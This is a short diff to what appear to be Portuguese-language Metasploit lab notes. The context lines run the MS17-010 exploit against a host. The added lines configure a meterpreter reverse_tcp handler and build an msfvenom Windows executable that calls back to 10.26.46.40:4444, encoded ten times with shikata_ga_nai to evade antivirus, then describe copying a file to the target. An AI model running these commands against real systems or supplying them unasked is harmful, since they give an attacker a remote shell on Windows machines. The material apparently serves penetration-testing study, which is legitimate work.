@@ -44,3 +44,14 @@ Acessar o modo Exploit:	<br>	use exploit/ms17_010/ms_17_010<br>
 				show options<br>
 				set rhosts 192.168.1.1<br>
 				exploit<br>
+				
+use exploit/multi/handler 
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+show options
+set LHOST 10.26.46.
+msfvenom -h
+
+#Novo terminal
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.26.46.40 LPORT=4444 -f exe -e x64/shikata_ga_nai -i 10 > /root/exploit.exe
+
+#Copiar arquivo eicar.com para o Windows, pode usar o exploit/ms17_010 com a opção upload ou acessar via pasta compartilhada.
